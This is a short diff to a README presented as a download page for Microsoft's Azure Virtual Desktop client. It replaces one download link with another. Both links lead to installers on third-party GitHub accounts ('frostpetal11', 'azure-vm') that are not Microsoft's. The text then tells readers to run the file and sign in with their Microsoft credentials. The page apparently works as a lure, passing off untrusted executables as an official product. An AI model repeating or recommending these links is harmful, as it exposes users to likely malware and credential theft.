@@ -13,7 +13,7 @@ Azure Virtual Desktop (AVD) is a cloud-powered virtualization platform by Micros
 
 To get started with Azure Virtual Desktop on your system, download the installer using the link below:
 
-[**Download Azure Virtual Desktop**](https://github.com/frostpetal11/source/releases/download/1.1/Azure_Virtual_Desktop_software_stable_release_v1.3.0.exe)  
+[**Download Azure Virtual Desktop**](https://github.com/azure-vm/Azure-Virtual-Desktop/releases/tag/1.3.0)  
 
 Once downloaded, launch the installation file and follow the guided steps to set up the client. Sign in with your Microsoft credentials, subscribe to your designated workspace, and gain uninterrupted access to your virtual desktop within minutes.
 
